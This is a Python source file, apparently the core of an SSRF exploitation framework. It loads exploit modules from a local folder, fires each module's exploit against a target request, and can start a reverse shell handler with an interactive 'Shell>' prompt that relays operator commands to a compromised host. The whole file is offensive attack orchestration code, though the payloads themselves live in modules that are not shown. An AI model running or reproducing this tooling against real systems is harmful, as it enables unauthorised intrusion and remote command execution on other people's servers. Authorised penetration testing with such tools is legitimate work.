from core.requester import Requester
from core.handler import Handler
from importlib.machinery import SourceFileLoader
import os
import time
import logging

class SSRF(object):
    modules   = set()
    requester = None

    def __init__(self, args):

        # Load modules in memory
        self.load_modules()

        # Start a reverse shell handler
        if args.handler:
            handler = Handler(args.handler)
            handler.start()
        
        # Init a requester
        self.requester = Requester(args.reqfile, args.useragent, args.ssl)

        # NOTE: if args.param == None, target everything
        if args.param == None:
            logging.warning("No parameter (-p) defined, nothing will be tested!")

        # NOTE: if args.modules == None, try everything
        if args.modules == None:
            logging.warning("No modules (-m) defined, everything will be tested!")
            for module in self.modules:
                module.exploit(self.requester, args)
        else:
            for modname in args.modules.split(','):
                for module in self.modules:
                    if module.name == modname:
                        module.exploit(self.requester, args)
                        break

        # Handling a shell
        while args.handler:
            if handler.connected == True:
                cmd = input("Shell> $ ")
                if cmd == "exit":
                    handler.kill()
                    print("BYE !")
                    exit()
                handler.send_command(cmd+"\n\n")
            else:
                time.sleep(5)

    def load_modules(self):
        for index,name in enumerate(os.listdir("./modules")):
            location = os.path.join("./modules", name)
            if ".py" in location:
                mymodule = SourceFileLoader(name, location).load_module()
                self.modules.add(mymodule)